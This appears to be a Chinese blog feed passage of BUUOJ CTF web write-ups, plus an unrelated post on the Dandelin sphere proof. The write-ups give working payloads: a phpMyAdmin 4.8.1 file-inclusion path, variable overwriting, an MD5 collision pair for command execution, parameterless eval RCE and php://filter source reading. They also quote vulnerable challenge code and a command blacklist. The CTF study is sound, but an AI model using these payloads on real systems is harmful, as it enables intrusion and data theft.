    <content type="html"><![CDATA[<p>做做buuoj上的web题，本萌新纯采集，轻喷（（（</p><p>没想到这个连续剧居然做到第三集了（？</p><span id="more"></span><h2><span id="gwctf-2019-我有一个数据库"> [GWCTF 2019] 我有一个数据库</span></h2><p>打开靶机，一眼乱码…</p><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/4.png" class title="rwr"><p>使用charset改编码：</p><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/5.png" class title="rwr"><p>好，那就用dirsearch开找，由于万恶的反爬，还是只能用低线程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python.exe .\dirsearch.py -u http://59a09390-<span class="number">2</span>10c-<span class="number">48e3</span>-a698-1e6e1dd52325.node4.buuoj.cn:<span class="number">81</span>/ -e * --timeout=<span class="number">2</span> -t <span class="number">1</span> -x <span class="number">400</span>,<span class="number">403</span>,<span class="number">404</span>,<span class="number">500</span>,<span class="number">503</span>,<span class="number">429</span></span><br></pre></td></tr></table></figure><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/6.png" class title="sws"><p>跑出了phpmyadmin和robots.txt</p><p>访问robots.txt</p><p>发现提示是phpinfo.php</p><p>所以直接选择看/phpmyadmin/</p><p>发现是phpmyadmin 4.8.1的版本</p><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/7.png" class title="twt"><p>然后就上万能的CSDN…</p><p>发现有本地包含漏洞</p><p>直接拿漏洞打就完事了：</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=sql.php%253f../../../../../../../../../../flag</span><br></pre></td></tr></table></figure><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/8.png" class title="uwu"><h2><span id="bjdctf2020-mark-loves-cat"> [BJDCTF2020] Mark loves cat</span></h2><p>变量覆盖题。</p><p>进入靶机，就是一个贼酷炫的前端页面（</p><p>然后啥也点不了</p><p>这个时候就要考虑是不是有dirsearch可以扫出来的东西了</p><p>使用dirsearch 能够扫描出/.git/</p><p>使用githack下载源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;<span class="comment">//对于POST传入的变量 a = b时，变成 $a=b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>; <span class="comment">//对于 GET传入的变量 a=b时，变成 $a = $b</span></span><br><span class="line">    <span class="comment">//可以使用GET传入变量将上面的三个变量覆盖成$flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);<span class="comment">//exit函数，输出一条信息，并退出当前脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>所以思路很清晰，只需要将上面那三个变量选一个覆盖成$flag，然后再满足你所选择变量的exit条件即可</p><p>(虽然但是我到现在都不知道handsome要怎么做，怎么让flag=一个变量，这个变量又不能等于flag啊)</p><p>方法一：</p><p>如果选择yds：</p><p>首先将yds覆盖成flag：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><p>然后…</p><p>如果GET传入flag和POST传入的flag都是空的话，就exit了</p><p>所以直接结束</p><p>方法二：</p><p>如果选择is：</p><p>还是先将is覆盖成flag：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag</span><br></pre></td></tr></table></figure><p>看条件，如果get或者post传入flag的值为flag时，exit</p><p>所以后面传入flag=flag即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/1.png" class title="owo"><h2><span id="安洵杯-2019-easy_web"> [安洵杯 2019] easy_web</span></h2><p>打开一看，也是啥都没有。。。</p><p>不过首页那个img=比较奇怪，看起来像base64加密</p><p>把他拖入CyberChef，发现其经过了1次Hex加密和2次base64加密</p><p>最初的结果是555.png</p><p>大抵就是那张图片？</p><p>利用这个原理，我们将555.png改为index.php，然后进行同样的加密，尝试获取源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));//img解密</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;//post的值a不能等于b，但是a的md5与b的md5值要强相等</span><br><span class="line">        echo `$cmd`;//echo + 反引号 相当于命令执行</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里最大的问题就是如何使得一个字符串a的值不等于b，md5的值又要强相等（如果是两个等号，可以使用0e开头的md5）</p><p>使用 fastcoll 快速MD5碰撞生成器：</p><p>可以构建两个md5值一样，但是内容完全不一样的字符串</p><p>使用方法如下：</p><ul><li>创建一个文本文件，写入内容，命名</li><li>cmd运行：</li><li>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt（其中init是你创建的文本文件，1.txt和2.txt是生成的两个文本的txt文件）</li></ul><p>然后需要进行一步url编码才能够正常使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))===<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)!=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>result：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=qwq%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00I%EC%91%C5Q%87a%CAzE%92%5D%D4%FF%EB%B1%C8%BE%F7EZq%ADJEb%82u%95%80%8B%FF%0C%F3%B8%D8P%8Eb%E7%0B%C8O%199%12%7Df%5El%ADE%BF%CB%95Z%C4%60%84%3A%8E%8F%85%18%C2%D0%9D%D7Z%28%90%E3%3DP%B6%D8%9B%89%A0%CEq%05%CDa%06%90%83%8Bv%EF%DF%CBOQ%A3%C1%AA%10%AD-%96%89z%D6%AB%93%E7X%D2%02%DE%3E%B4%F9%87%CF%B6%C4%D2-%2B%10%D5%F5%11%049%3D</span><br><span class="line">b=qwq%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00I%EC%91%C5Q%87a%CAzE%92%5D%D4%FF%EB%B1%C8%BE%F7%C5Zq%ADJEb%82u%95%80%8B%FF%0C%F3%B8%D8P%8Eb%E7%0B%C8O%199%92%7Df%5El%ADE%BF%CB%95Z%C4%60%84%BA%8E%8F%85%18%C2%D0%9D%D7Z%28%90%E3%3DP%B6%D8%9B%89%A0%CEq%05%CD%E1%06%90%83%8Bv%EF%DF%CBOQ%A3%C1%AA%10%AD-%96%89z%D6%AB%93%E7X%D2%82%DD%3E%B4%F9%87%CF%B6%C4%D2-%2B%10%D5u%11%049%3D</span><br></pre></td></tr></table></figure><p>由于字符串比较长，所以使用burp进行Post传参：对于过滤，使用反斜杠绕过，空格使用%20进行url编码（burp里面打那个空格直接bad request了）：</p><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/2.png" class title="owo"><p>找到flag</p><p>直接cat /flag</p><img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/3.png" class title="pwp">]]></content>
    
    
    <summary type="html">&lt;p&gt;做做buuoj上的web题，本萌新纯采集，轻喷（（（&lt;/p&gt;
&lt;p&gt;没想到这个连续剧居然做到第三集了（？&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Dandelin双球模型</title>
    <link href="http://example.com/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/"/>
    <id>http://example.com/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/</id>
    <published>2022-12-19T09:37:02.000Z</published>
    <updated>2023-03-12T09:43:56.840Z</updated>
    
    <content type="html"><![CDATA[<p>最近有个小朋友问我Dandelin用来证明一个平面截圆锥得到的截口曲线是椭圆的模型的题咋做的，我一看，我大意了，不会做…</p><p>所以直接去网上百度一下，水了一篇博客出来</p><span id="more"></span><h2><span id="0x01-dandelin模型"> 0x01 Dandelin模型</span></h2><p><s>你是否在寻找Dandelion()</s></p><p>Germinal Dandelin，著名数学家，主要成就有Dandelin双球模型，在圆锥与圆的切线等研究上取得了巨大的成果。其Dandelin的双球模型便是在一个圆锥内塞入两个球，这两个球既与圆锥相内切，又与一个公共平面相切，这个公共平面截圆锥所得到的截口曲线便是圆锥曲线（可以是椭圆、双曲线和抛物线）</p><h2><span id="0x02-dandelin双球模型的证明"> 0x02 Dandelin双球模型的证明</span></h2><p>根据圆锥曲线的第一定义即可证明：</p><p>如果平面内一动点与两定点F1、F2的距离之和等于一个常数的轨迹为椭圆</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/1.jpg" class title="证明"><p>那么我们就有如下的证明过程，假设上面的小圆圆心为O1、大圆圆心为O2，内切球与圆锥的交点为B、C：</p><p>所以截口曲线便是椭圆</p><h2><span id="0x03-截口曲线离心率的计算"> 0x03 截口曲线离心率的计算</span></h2><p>离心率计算公式：</p><p>那么我们根据几何关系计算出c和a即可</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/2.png" class title="截面图"><p>为方便计算取其截面图如上，并且添加辅助线后的图如下（辅助线是手动添加的，可能十分不平整）：</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/3.png" class title="辅助线"><p>假设D、E是切点，连接O1F1、O2F2、O1D、O2E</p><p>又作O1G垂直于O2E，垂足为G（O1、F1、G三点并不共线）</p><p>同时设轴线C1C2与平面α的交点为H 夹角为β、与母线的夹角为γ</p><p>由上面的推导可得到：</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/7.png" class title="证明过程"><p>容易证明得到：</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/8.png" class title="证明过程"><p>就能够将DE转到O1G</p><p>接下来提供两种方法（其实二者是一致，实际上只有一种的）：</p><p>（假设圆的半径，O1O2的距离已知）</p><p>法一：</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/9.png" class title="计算过程"><p>其实细细看来可以进行如下的推导：</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/10.png" class title="计算过程"><p>这也就是方法二，计算这两个夹角的余弦值即可</p><p>其实这两个方法确实是一样的（雾</p><hr><p>当然，如果选取的夹角不一样，得到的结论也会略有不同，但是离心率的值仍然是两个角度的比值：</p><p>参考了闲敲棋子落灯hua师傅的文章</p><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/4.png" class title="投影"><img src="/2022/12/19/Dandelin%E5%8F%8C%E7%90%83%E6%A8%A1%E5%9E%8B/11.png" class title="计算"><h2><span id="0x04-小拓展"> 0x04 小拓展</span></h2><p>由该双球模型得出的离心率的取值是由截面与底面的夹角α决定的（一般认为圆锥固定不变）</p><p>所以截取的角度不同，所得到的圆锥曲线也不同（根据离心率判断即可）</p><p>在某些动点类求轨迹的问题中，也可以通过截面与底面的夹角α，母线与底面的夹角β来确定离心率，从而确定轨迹是何种圆锥曲线</p><p>更多的题型可以去参考棋子落灯hua师傅的文章，由于本人能力有限，这里就不作展开</p><hr><span class="blur">其实真的是因为我又菜又懒，然后啥也不会...</span><hr><p>参考文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/462217176">【解题研究】对于圆锥截口曲线性状的Dandelin双球证明</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有个小朋友问我Dandelin用来证明一个平面截圆锥得到的截口曲线是椭圆的模型的题咋做的，我一看，我大意了，不会做…&lt;/p&gt;
&lt;p&gt;所以直接去网上百度一下，水了一篇博客出来&lt;/p&gt;</summary>
    
    
    
    <category term="不务正业系列" scheme="http://example.com/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="不务正业" scheme="http://example.com/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj题目(2)</title>
    <link href="http://example.com/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/"/>
    <id>http://example.com/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/</id>
    <published>2022-12-15T06:43:46.000Z</published>
    <updated>2023-03-12T09:43:56.838Z</updated>
    
    <content type="html"><![CDATA[<p>做做buuoj上的web题，本萌新纯采集，轻喷（（（</p><span id="more"></span><h2><span id="gxyctf-2019-禁止套娃"> [GXYCTF 2019] 禁止套娃</span></h2><p>打开靶机，页面直接显示 “flag在哪里呢？”</p><p>所以我们使用dirsearch扫描试试，看看是否有敏感文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://7aba8553-300c-45a5-<span class="number">8127</span>-dbfdd5038404.node4.buuoj.cn:<span class="number">81</span>/ --timeout=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>不得不说buu的反爬是真的恶心…扫快一点就会弹429</p><img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/2.png" class title="扫出git"><p>发现/.git/能正常访问</p><p>使用githack下载源码，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一眼顶针，鉴定为无参数RCE（经典括号嵌套）</p><p>这个过滤的挺少，直接祭出payload薄纱：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/3.png" class title="获取flag"><p>（雾）</p><hr><p>好了不闹了，先用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><p>看flag的位置：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;.git&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;flag.php&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>发现在倒数第二，使用array_reverse逆转到第二位，刚好能够使用next函数读取数组的第二位</p><p>使用show_source读取php文件即可</p><h2><span id="bsidescf-2020-had-a-bad-day"> [BSidesCF 2020] Had a bad day</span></h2><p>打开靶机，发现很多猫图和狗子的图片（雾，重点不是这个）</p><p>看看上面的url，发现category=</p><p>这引诱人上去加单引号啊（（（</p><p>试试加个单引号</p><p>发现报错了，但是报错的不是sql（</p><img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/4.png" class title="报错"><p>发现了include报错，尝试能不能打开index.php获取源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/resource=index</span></span><br></pre></td></tr></table></figure><p>成功读取base64，进行一个解码：</p><img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/5.png" class title="获取源码"><p>以下是解码的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 